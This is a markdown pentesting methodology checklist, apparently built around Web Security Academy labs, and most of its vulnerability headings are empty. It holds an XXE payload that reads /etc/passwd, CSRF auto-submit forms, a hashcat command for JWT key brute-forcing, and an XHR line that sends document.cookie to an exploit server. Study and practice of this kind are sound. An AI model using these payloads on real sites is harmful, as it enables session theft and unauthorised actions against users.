# Methodology

## Step 1 - Enumeration
### Directory fuzzing
Directory fuzzing list [here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/dirsearch.txt)

### Directory fuzzing

## Step 2 - Identify sensitive features
### Password
- Password reset
- Password change

### User data
- Email change

## Step 3 - Identify vulnrabilities
### SQL injections
### NoSQL injections
### Authentication
### Path traversal
### Command injection
### Business logic vulnerabilities
### Information disclosure
### Access control
### Command injection
### File upload
### Race conditions
### Server-side request forge (SSRF)
### Path traversal
#### LFI fuzzing
Fuzzing list [here](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)

### XXE Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### Cross-site scripting (XSS)
### Cross-site request forge (CSRF)
#### CSRF using Javascript fetch()
```
<html>
  <script>
    fetch("https://example.com", {
      method: "POST",
      credentials: "include",
      mode: "cors",
      body: JSON.stringify(donnees),
      headers: {
            "Content-Type": "application/json",
            // 'Content-Type': 'application/x-www-form-urlencoded',
          },
    });
  </script>
</html>
```
#### CSRF using Javascript XMLHTTPRequest()
```
// GET request
const req = new XMLHttpRequest();
req.open("GET", "http://www.example.org/example.txt");
req.send();

// POST request
formData="a=test&b=value";
xhr.open("POST", "/article/xmlhttprequest/post/user");
xhr.send(formData);

// Steal cookie
xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
xhr.send();
```
#### CSRF using Javascript HTML
```
<html>
  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```
### Cross-origin resource sharing (CORS)
### Clickjacking
### DOM-based vulnerabilities
### WebSockets
### Insecure deserialization
#### Java
##### Install JDK 11
1. Download from [Oracle website](https://www.oracle.com/java/technologies/javase/jdk11-archive-downloads.html)
2. Install (default path in C:\Program Files\Java\jdk-11)
3. Make sure environment variable JAVA_HOME is set to C:\Program Files\Java\jdk-11

##### Exploit
###### OOBs exploits
Leverage Python wrapper to get all payloads in a file, then use Intruder and wait for collaborator to retrieve DNS calls.

#### Others
### GraphQL API vulnerabilities
### Server-side template injection
### Web cache poisoning
### HTTP Host header attacks
#### Check reflection in response headers

### HTTP request smuggling
### OAuth authentication
### JWT attacks
#### Brute force key
Word list [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
### Prototype pollution



## Various
### Work with hash
#### Identify hash
Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
#### Crack hash
Online tool - [Crack station](https://crackstation.net)
#### Calculate hash
Online tool - [CyberChef](https://gchq.github.io/CyberChef)

#### Brute force hash
